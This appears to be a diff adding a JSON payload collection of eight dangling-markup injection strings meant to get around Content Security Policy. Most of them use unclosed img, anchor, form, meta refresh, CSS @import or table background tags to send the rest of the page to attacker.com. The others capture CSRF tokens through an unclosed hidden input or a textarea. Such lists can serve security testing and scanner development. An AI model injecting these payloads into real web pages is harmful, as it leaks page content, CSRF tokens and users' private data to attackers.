@@ -1,0 +1,80 @@
+{
+  "category": "csp_bypass",
+  "subcategory": "dangling_markup",
+  "description": "Dangling markup injection payloads — exfiltrate page content when inline styles are allowed but scripts are blocked",
+  "count": 8,
+  "payloads": [
+    {
+      "id": "csp-dangle-001",
+      "category": "csp_bypass",
+      "subcategory": "dangling_markup",
+      "payload": "<img src='https://attacker.com/steal?data=",
+      "description": "Dangling img src — captures page content until next quote",
+      "technique": "dangling_markup",
+      "csp_bypass": "Unclosed img src attribute exfiltrates subsequent HTML to attacker server"
+    },
+    {
+      "id": "csp-dangle-002",
+      "category": "csp_bypass",
+      "subcategory": "dangling_markup",
+      "payload": "<a href='https://attacker.com/steal?",
+      "description": "Dangling anchor href — captures content via link click",
+      "technique": "dangling_markup",
+      "csp_bypass": "Unclosed href captures form tokens and sensitive data in URL"
+    },
+    {
+      "id": "csp-dangle-003",
+      "category": "csp_bypass",
+      "subcategory": "dangling_markup",
+      "payload": "<form action='https://attacker.com/steal'><button>Submit</button><!--",
+      "description": "Dangling form + comment — captures page content as form data",
+      "technique": "dangling_markup",
+      "csp_bypass": "Form action + HTML comment consumes subsequent content"
+    },
+    {
+      "id": "csp-dangle-004",
+      "category": "csp_bypass",
+      "subcategory": "dangling_markup",
+      "payload": "<meta http-equiv='refresh' content='0;url=https://attacker.com/steal?data=",
+      "description": "Dangling meta refresh — exfiltrates content via redirect URL",
+      "technique": "dangling_markup",
+      "csp_bypass": "Meta refresh not blocked by script-src CSP directive"
+    },
+    {
+      "id": "csp-dangle-005",
+      "category": "csp_bypass",
+      "subcategory": "dangling_markup",
+      "payload": "<style>@import 'https://attacker.com/steal.css?token=",
+      "description": "Dangling CSS import — exfiltrates via style loading",
+      "technique": "dangling_markup",
+      "csp_bypass": "CSS @import not restricted when style-src allows unsafe-inline"
+    },
+    {
+      "id": "csp-dangle-006",
+      "category": "csp_bypass",
+      "subcategory": "dangling_markup",
+      "payload": "<table background='https://attacker.com/steal?data=",
+      "description": "Dangling table background — legacy attribute exfiltration",
+      "technique": "dangling_markup",
+      "csp_bypass": "Background attribute loads URL with subsequent HTML as query string"
+    },
+    {
+      "id": "csp-dangle-007",
+      "category": "csp_bypass",
+      "subcategory": "dangling_markup",
+      "payload": "<input type=hidden name=csrf value='",
+      "description": "Dangling hidden input — captures CSRF token from next input",
+      "technique": "dangling_markup",
+      "csp_bypass": "Unclosed attribute value captures subsequent form tokens"
+    },
+    {
+      "id": "csp-dangle-008",
+      "category": "csp_bypass",
+      "subcategory": "dangling_markup",
+      "payload": "<textarea>",
+      "description": "Dangling textarea — consumes all subsequent HTML as text content",
+      "technique": "dangling_markup",
+      "csp_bypass": "Unclosed textarea swallows page content for DOM extraction"
+    }
+  ]
+}
